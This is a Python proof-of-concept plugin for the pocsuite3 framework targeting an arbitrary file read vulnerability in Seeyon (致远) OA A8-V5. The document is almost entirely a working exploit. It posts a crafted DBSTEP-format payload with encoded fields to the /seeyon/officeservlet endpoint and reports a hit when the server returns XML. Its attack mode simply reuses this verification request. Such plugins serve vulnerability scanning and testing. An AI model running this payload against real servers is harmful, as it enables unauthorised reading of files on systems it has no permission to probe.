#!/usr/bin/env python
# -*- coding:utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''致远OA A8-V5存在任意文件读取漏洞'''
    desc = ''''''
    solution = ''''''
    severity = '''medium'''
    vulType = '''file-download'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''致远OA A8-V5'''
    appVersion = '''致远OA A8-V5'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        verify_url = make_verify_url(self.url, '/seeyon/officeservlet', mod=0)
        data = '''DBSTEP V3.0     331             0               0                      currentUserId=ziCEz4eEz4KuzUK3ziKGwUdszg66\r\nRECORDID=wLKhwLK6\r\nCREATEDATE=wLShwUgsP4o3Pg66\r\noriginalFileId=wV66\r\nneedReadFile=NrMGyV66\r\noriginalCreateDate=wLShwUgsP4o3Pg66\r\nOPTION=LKDxOWOWLlxwVlOW\r\nCOMMAND=BSTLOlMSOCQwOV66\r\nTEMPLATE=qf85qfDEyYMJdrxiqEzQyaQvcfDaOSo0BST1qENQefTucYs6\r\naffairMemberId=wV66\r\naffairMemberName=OKlzLs66'''
        resp = requests.post(verify_url, verify=False, timeout=15, data=data)
        if b'<?xml version="1.0" encoding="UTF-8"?>' in resp.content and resp.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
